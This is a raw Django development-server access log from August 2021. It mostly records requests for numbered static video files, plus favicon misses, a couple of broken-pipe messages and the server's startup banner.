[09/Aug/2021 03:43:18] "GET /static/a4.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:43:24] "GET /static/a1.mp4 HTTP/1.1" 200 4161536
[09/Aug/2021 03:43:24] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:24] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:25] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:26] "GET /static/a4.mp4 HTTP/1.1" 200 102400
[09/Aug/2021 03:43:38] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:43:38] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:43:39] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:39] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:39] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:41] "GET /static/a4.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:43:41] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:41] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:41] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:43] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:43] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:44] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:46] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:47] "GET /static/a2.mp4 HTTP/1.1" 200 126976
[09/Aug/2021 03:43:48] "GET /static/a2.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:43:48] "GET /static/a2.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:43:48] "GET /static/a2.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:43:50] "GET /static/a1.mp4 HTTP/1.1" 200 3895296
[09/Aug/2021 03:43:50] "GET /static/a1.mp4 HTTP/1.1" 200 475136
[09/Aug/2021 03:43:50] "GET /static/a1.mp4 HTTP/1.1" 200 348160
[09/Aug/2021 03:43:51] "GET /static/a1.mp4 HTTP/1.1" 200 389120
[09/Aug/2021 03:43:53] "GET /static/a1.mp4 HTTP/1.1" 200 360448
Not Found: /config/getuser
[09/Aug/2021 03:44:05] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
[09/Aug/2021 03:44:50] "GET /static/a4.mp4 HTTP/1.1" 304 0
[09/Aug/2021 03:44:50] "GET /static/a4.mp4 HTTP/1.1" 200 557056
[09/Aug/2021 03:44:54] "GET /static/a4.mp4 HTTP/1.1" 200 446464
[09/Aug/2021 03:44:55] "GET /static/a4.mp4 HTTP/1.1" 200 8437920
[09/Aug/2021 03:44:55] "GET /static/a4.mp4 HTTP/1.1" 200 8437920
[09/Aug/2021 03:45:34] "GET /static/a4.mp4 HTTP/1.1" 304 0
[09/Aug/2021 03:45:58] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:45:58] "GET /static/a2.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:45:58] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:45:58] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:45:58] "GET /static/a2.mp4 HTTP/1.1" 200 1249280
[09/Aug/2021 03:45:59] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:45:59] "GET /static/a2.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:45:59] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:46:00] "GET /static/a2.mp4 HTTP/1.1" 200 126976
[09/Aug/2021 03:46:01] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:46:03] "GET /static/a4.mp4 HTTP/1.1" 304 0
[09/Aug/2021 03:46:03] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:46:14] "GET /static/a1.mp4 HTTP/1.1" 200 925696
[09/Aug/2021 03:46:17] "GET /static/a1.mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:46:35] "GET /static/a3.mp4 HTTP/1.1" 404 1894
Not Found: /favicon.ico
[09/Aug/2021 03:46:35] "GET /favicon.ico HTTP/1.1" 404 2248
Not Found: /favicon.ico
[09/Aug/2021 03:46:41] "GET /favicon.ico HTTP/1.1" 404 2248
[09/Aug/2021 03:46:50] "GET /static/a5.mp4 HTTP/1.1" 200 430080
Not Found: /favicon.ico
[09/Aug/2021 03:46:50] "GET /favicon.ico HTTP/1.1" 404 2248
[09/Aug/2021 03:46:51] "GET /static/a5.mp4 HTTP/1.1" 200 1651215
[09/Aug/2021 03:46:55] "GET /static/a6.mp4 HTTP/1.1" 200 208896
Not Found: /favicon.ico
[09/Aug/2021 03:46:56] "GET /favicon.ico HTTP/1.1" 404 2248
[09/Aug/2021 03:46:56] "GET /static/a6.mp4 HTTP/1.1" 200 991738
[09/Aug/2021 03:47:01] "GET /static/a7.mp4 HTTP/1.1" 200 667648
[09/Aug/2021 03:47:01] "GET /static/a7.mp4 HTTP/1.1" 200 1742430
Not Found: /favicon.ico
[09/Aug/2021 03:47:01] "GET /favicon.ico HTTP/1.1" 404 2248
[09/Aug/2021 03:47:07] "GET /static/a8.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:47:11] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:47:12] "GET /static/a5.mp4 HTTP/1.1" 200 1651215
[09/Aug/2021 03:47:12] "GET /static/a5.mp4 HTTP/1.1" 200 1651215
[09/Aug/2021 03:47:12] "GET /static/a5.jpg HTTP/1.1" 200 23095
[09/Aug/2021 03:47:12,727] - Broken pipe from ('10.59.212.188', 40756)

[09/Aug/2021 03:47:12] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:47:12] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:47:12] "GET /static/a1.mp4 HTTP/1.1" 200 352256
[09/Aug/2021 03:47:12] "GET /static/a1.mp4 HTTP/1.1" 200 1867776
[09/Aug/2021 03:47:13] "GET /static/a1.mp4 HTTP/1.1" 200 167936
[09/Aug/2021 03:47:14] "GET /static/a1.mp4 HTTP/1.1" 200 446464
[09/Aug/2021 03:47:16] "GET /static/a1.mp4 HTTP/1.1" 200 409600
[09/Aug/2021 03:47:21] "GET /static/a2.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:47:26] "GET /static/a5.mp4 HTTP/1.1" 200 1130496
[09/Aug/2021 03:47:27] "GET /static/a5.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:47:27] "GET /static/a5.mp4 HTTP/1.1" 200 1651215
[09/Aug/2021 03:47:27,250] - Broken pipe from ('10.59.212.188', 40808)

[09/Aug/2021 03:47:34] "GET /static/a4.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:47:38] "GET /static/a4.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:47:38] "GET /static/a3.mp4Raised HTTP/1.1" 404 1912
[09/Aug/2021 04:01:01] "GET /static/a4.mp4 HTTP/1.1" 200 4943872
Not Found: /manager/html
[09/Aug/2021 04:03:18] "GET /manager/html HTTP/1.1" 404 2251
Performing system checks...

System check identified no issues (0 silenced).
August 08, 2021 - 16:22:08
Django version 3.2.6, using settings 'djangoProject.settings'
Starting development server at http://0.0.0.0:8080/
Quit the server with CONTROL-C.
